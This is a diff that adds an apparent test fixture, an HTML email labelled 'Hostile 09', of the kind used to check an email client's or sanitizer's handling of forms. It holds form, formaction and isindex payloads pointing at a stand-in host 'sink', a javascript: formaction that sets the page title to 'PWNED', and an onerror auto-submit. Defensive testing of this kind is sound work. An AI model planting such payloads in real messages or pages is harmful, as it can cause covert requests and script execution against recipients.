@@ -1,0 +1,21 @@
+From: Hostile Sender <hostile@example.org>
+To: hostile@example.test
+Subject: Hostile 09: form action to sink, input, button formaction, isindex
+Date: Mon, 2 Nov 2026 10:09:00 +0000
+Message-ID: <hostile-09@example.org>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"></head><body>
+<p>Visible text 09</p>
+<form action="http://sink/09-forms/form" method="post"><input name=a value=b><input type=submit></form>
+<form id=f2 action="http://sink/09-forms/form2"><button formaction="http://sink/09-forms/formaction">go</button></form>
+<form><input type=submit formaction="javascript:top.document.title='PWNED'" value=js></form>
+<button form=f2 formaction="http://sink/09-forms/button-form-attr">outer</button>
+<input type=image src="http://sink/09-forms/input-image" formaction="http://sink/09-forms/input-image-fa">
+<isindex action="http://sink/09-forms/isindex" prompt="x">
+<isindex type=image src="http://sink/09-forms/isindex-src">
+<form action="http://sink/09-forms/autosubmit"><input name=x><img src=x onerror="this.form.submit()"></form>
+</body></html>
